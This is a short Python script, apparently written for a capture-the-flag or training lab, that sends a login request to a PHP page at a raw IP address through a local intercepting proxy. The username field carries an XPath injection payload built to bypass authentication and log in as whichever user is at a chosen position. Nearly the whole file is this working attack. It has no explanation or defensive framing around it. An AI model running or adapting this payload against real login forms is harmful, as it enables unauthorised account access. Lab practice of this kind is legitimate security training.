import requests
# import sys
# Post Request

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = "http://83.136.254.47:57862/login.php"

data = {
	# 'username': sys.argv[1], Caso queira usar parametros 
	# 'pass': sys.argv[2]
	'username': "' or position()=3 or '",
	'pass': ''
}

response = requests.post(url, data=data, headers=headers, proxies=proxies)
print(response.status_code)
print(response.text)